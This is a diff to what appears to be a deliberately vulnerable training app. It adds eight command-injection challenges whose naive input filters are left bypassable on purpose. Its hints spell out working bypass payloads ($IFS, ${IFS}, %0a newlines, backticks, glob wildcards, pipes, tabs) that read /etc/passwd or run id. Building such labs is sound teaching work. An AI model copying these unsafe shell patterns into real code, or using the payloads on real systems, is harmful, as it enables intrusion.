@@ -42,7 +42,7 @@ function runPing(host, done) {
       // injected command output is still visible to the learner.
       html = `<h3>Command output</h3><pre>${esc(String(err.message || err))}</pre>`;
     }
-    done(html);
+    done(html, out);
   });
 }
 
@@ -116,6 +116,180 @@ router.get('/ping2', (req, res) => {
   });
 });
 
+// ------------------------------------------------- batch 05: filter-bypass series
+// Each gadget below is a ping form with a slightly different naive filter.
+// Challenge page slug per vuln id (used by the index page links).
+const CMDI_PAGE_FOR = {
+  basic: 'ping', bypass: 'ping2',
+  'cmdi-ifs': 'ping3', 'cmdi-braces': 'ping4', 'cmdi-newline': 'ping5',
+  'cmdi-backtick': 'ping6', 'cmdi-wildcard': 'ping7', 'cmdi-pipe': 'ping8',
+  'cmdi-tab': 'ping9', 'cmdi-env': 'ping10',
+};
+
+VULNS.push(
+  {
+    id: 'cmdi-ifs',
+    name: 'Ping Gadget v3 (spaces stripped)',
+    difficulty: 'Medium',
+    hint: 'Every space is deleted from your input, but the shell still needs word separators. Bash has a built-in variable that expands to whitespace.',
+    how: 'Replace spaces with $IFS, e.g. ?host=127.0.0.1;cat$IFS/etc/passwd',
+  },
+  {
+    id: 'cmdi-braces',
+    name: 'Ping Gadget v4 ($IFS blocked too)',
+    difficulty: 'Medium',
+    hint: 'Spaces are stripped and the literal text $IFS is stripped as well. The braced form of a variable looks different to a naive string filter.',
+    how: 'Use ${IFS} instead of $IFS, e.g. ?host=127.0.0.1;cat${IFS}/etc/passwd',
+  },
+  {
+    id: 'cmdi-newline',
+    name: 'Ping Gadget v5 (separators blocked)',
+    difficulty: 'Medium',
+    hint: 'The characters ; & and | are all stripped. But a shell treats more than those as command separators. In a URL, %0a becomes one of them.',
+    how: 'Inject a newline (%0a) to start a second command, e.g. ?host=127.0.0.1%0acat /etc/passwd',
+  },
+  {
+    id: 'cmdi-backtick',
+    name: 'Ping Gadget v6 ($() blocked)',
+    difficulty: 'Easy',
+    hint: 'The filter removes $(, killing the modern command-substitution syntax. The shell has an older syntax that does the same job.',
+    how: 'Use backticks for command substitution, e.g. ?host=127.0.0.1;echo `id`',
+  },
+  {
+    id: 'cmdi-wildcard',
+    name: 'Ping Gadget v7 (cat and / blocked)',
+    difficulty: 'Hard',
+    hint: 'The words "cat" and "/" are stripped as standalone tokens. The shell expands ? into any single character, including inside paths and command names.',
+    how: 'Glob your way around both words, e.g. ?host=127.0.0.1;/???/bin/?at /???/p?sswd',
+  },
+  {
+    id: 'cmdi-pipe',
+    name: 'Ping Gadget v8 (; blocked)',
+    difficulty: 'Easy',
+    hint: 'Semicolons are stripped, but the shell has other ways to chain commands. One of them feeds the first command output into the second.',
+    how: 'Chain with a pipe, e.g. ?host=127.0.0.1|id (encode & as %26 when you need it, but | needs no encoding)',
+  },
+  {
+    id: 'cmdi-tab',
+    name: 'Ping Gadget v9 (spaces blocked, again)',
+    difficulty: 'Easy',
+    hint: 'Spaces are stripped from your input. A literal tab character (%09 in a URL) is also whitespace to the shell.',
+    how: 'Use a tab as the word separator, e.g. ?host=127.0.0.1;cat%09/etc/passwd',
+  },
+  {
+    id: 'cmdi-env',
+    name: 'Ping Gadget v10 (metachars blocked, unquoted)',
+    difficulty: 'Medium',
+    hint: 'The blacklist strips ; | & $ and backticks, and the value is dropped into the command line with no quotes. One classic separator is missing from the list.',
+    how: 'Inject a newline (%0a) to run a second command, e.g. ?host=127.0.0.1%0aid',
+  },
+);
+
+// Generic filtered ping gadget. opts: { route, vulnId, title, briefHtml, hintHtml,
+// filter(host)->filtered, awardCheck(host, filtered, stdout)->bool }
+function filteredGadget(opts) {
+  router.get('/' + opts.route, (req, res) => {
+    const host = req.query.host !== undefined ? String(req.query.host) : '127.0.0.1';
+    if (req.query.host === undefined) {
+      return res.send(page(opts.title, `
+        <h1>${esc(opts.title)}</h1>
+        ${brief('Challenge', opts.briefHtml)}
+        ${pingForm('/cmdi/' + opts.route, '127.0.0.1')}
+        ${hintBox(opts.hintHtml)}
+      `));
+    }
+    const filtered = opts.filter(host);
+    runPing(filtered, (outputHtml, out) => {
+      let extra = '';
+      if (opts.awardCheck(host, filtered, out || '')) {
+        const flag = award(req, 'cmdi', opts.vulnId);
+        extra = flagBox(flag);
+      }
+      res.send(page(opts.title, `
+        <h1>${esc(opts.title)}</h1>
+        ${pingForm('/cmdi/' + opts.route, host)}
+        <p class="dim">Filtered host value sent to the shell: <code>${esc(filtered)}</code></p>
+        ${outputHtml}
+        ${extra}
+        ${hintBox(opts.hintHtml)}
+        <p><a href="/cmdi">Back to Command Injection</a></p>
+      `));
+    });
+  });
+}
+
+filteredGadget({
+  route: 'ping3', vulnId: 'cmdi-ifs', title: 'Ping Gadget v3',
+  briefHtml: 'The developers now strip <b>every space</b> from your input before building the shell command. Find another way to separate your words.',
+  hintHtml: 'Try <code>?host=127.0.0.1;cat$IFS/etc/passwd</code> - <code>$IFS</code> expands to whitespace inside the shell.',
+  // VULN: spaces are stripped, but $IFS still expands to a word separator in the shell.
+  filter: (host) => host.replace(/ /g, ''),
+  awardCheck: (host, filtered, out) => /\$(\{)?IFS\}?/.test(host) && out.includes('root:'),
+});
+
+filteredGadget({
+  route: 'ping4', vulnId: 'cmdi-braces', title: 'Ping Gadget v4',
+  briefHtml: 'Spaces are stripped, and now the literal text <code>$IFS</code> is stripped too. The filter is just string matching, not shell parsing.',
+  hintHtml: 'Try <code>?host=127.0.0.1;cat${IFS}/etc/passwd</code> - the braced form <code>${IFS}</code> does not match the <code>$IFS</code> string filter.',
+  // VULN: the filter removes the exact string $IFS, but ${IFS} expands the same variable.
+  filter: (host) => host.replace(/ /g, '').replace(/\$IFS/g, ''),
+  awardCheck: (host, filtered, out) => /\$\{IFS\}/.test(host) && out.includes('root:'),
+});
+
+filteredGadget({
+  route: 'ping5', vulnId: 'cmdi-newline', title: 'Ping Gadget v5',
+  briefHtml: 'The filter now strips <code>;</code>, <code>&amp;</code> and <code>|</code>. Every classic command separator is gone... or is it?',
+  hintHtml: 'Try <code>?host=127.0.0.1%0acat /etc/passwd</code> - <code>%0a</code> decodes to a newline, and the shell runs each line as its own command.',
+  // VULN: ; & | are stripped, but a newline still separates commands in the shell.
+  filter: (host) => host.replace(/[;&|]/g, ''),
+  awardCheck: (host, filtered, out) => host.includes('\n') && out.includes('root:'),
+});
+
+filteredGadget({
+  route: 'ping6', vulnId: 'cmdi-backtick', title: 'Ping Gadget v6',
+  briefHtml: 'The filter removes <code>$(</code>, blocking the modern <code>$(...)</code> command-substitution syntax. Older shells had another way.',
+  hintHtml: 'Try <code>?host=127.0.0.1;echo `id`</code> - backticks are the legacy command-substitution syntax and the filter never mentions them.',
+  // VULN: $( is stripped, but legacy backtick command substitution still runs.
+  filter: (host) => host.replace(/\$\(/g, ''),
+  awardCheck: (host, filtered, out) => host.includes('`') && out.includes('uid='),
+});
+
+filteredGadget({
+  route: 'ping7', vulnId: 'cmdi-wildcard', title: 'Ping Gadget v7',
+  briefHtml: 'The filter strips the word <code>cat</code> and any standalone <code>/</code> token. You need to read <code>/etc/passwd</code> without typing either.',
+  hintHtml: 'Try <code>?host=127.0.0.1;/???/bin/?at /???/p?sswd</code> - the shell expands each <code>?</code> into one character, rebuilding <code>/bin/cat /etc/passwd</code> at run time.',
+  // VULN: word-boundary blacklist for cat and / is defeated by ? glob wildcards.
+  filter: (host) => host.replace(/\bcat\b/gi, '').replace(/(^|\s)\/(?=\s|$)/g, '$1'),
+  awardCheck: (host, filtered, out) => host.includes('?') && out.includes('root:'),
+});
+
+filteredGadget({
+  route: 'ping8', vulnId: 'cmdi-pipe', title: 'Ping Gadget v8',
+  briefHtml: 'Semicolons are stripped from your input. The shell offers other command separators that this filter forgot.',
+  hintHtml: 'Try <code>?host=127.0.0.1|id</code> - the pipe chains ping into id without any semicolon.',
+  // VULN: only ; is stripped; | still chains commands.
+  filter: (host) => host.replace(/;/g, ''),
+  awardCheck: (host, filtered, out) => host.includes('|') && out.includes('uid='),
+});
+
+filteredGadget({
+  route: 'ping9', vulnId: 'cmdi-tab', title: 'Ping Gadget v9',
+  briefHtml: 'Spaces are stripped from your input again. But space is not the only whitespace the shell understands.',
+  hintHtml: 'Try <code>?host=127.0.0.1;cat%09/etc/passwd</code> - <code>%09</code> decodes to a literal tab, which separates words just like a space.',
+  // VULN: spaces are stripped, but a literal tab still acts as a shell word separator.
+  filter: (host) => host.replace(/ /g, ''),
+  awardCheck: (host, filtered, out) => host.includes('\t') && out.includes('root:'),
+});
+
+filteredGadget({
+  route: 'ping10', vulnId: 'cmdi-env', title: 'Ping Gadget v10',
+  briefHtml: 'The blacklist strips <code>;</code> <code>|</code> <code>&amp;</code> <code>$</code> and backticks, and your value is dropped into the command line <b>with no quotes</b>. One separator is missing from the list.',
+  hintHtml: 'Try <code>?host=127.0.0.1%0aid</code> - <code>%0a</code> decodes to a newline, and an unquoted newline starts a brand-new command.',
+  // VULN: the blacklist misses newline, and the unquoted value lets it start a second command.
+  filter: (host) => host.replace(/[;|&$`]/g, ''),
+  awardCheck: (host, filtered, out) => host.includes('\n') && out.includes('uid='),
+});
+
 // Module index page
 router.get('/', (req, res) => {
   const rows = VULNS.map((v) => `
@@ -123,7 +297,7 @@ router.get('/', (req, res) => {
       <td><b>${esc(v.name)}</b><br><span class="dim">${esc(v.how)}</span></td>
       <td>${esc(v.difficulty)}</td>
       <td>${hintBox(esc(v.hint))}</td>
-      <td><a href="/cmdi/${v.id === 'basic' ? 'ping' : 'ping2'}">Open challenge</a></td>
+      <td><a href="/cmdi/${CMDI_PAGE_FOR[v.id]}">Open challenge</a></td>
     </tr>`).join('');
   res.send(page('Command Injection', `
     <h1>Command Injection</h1>
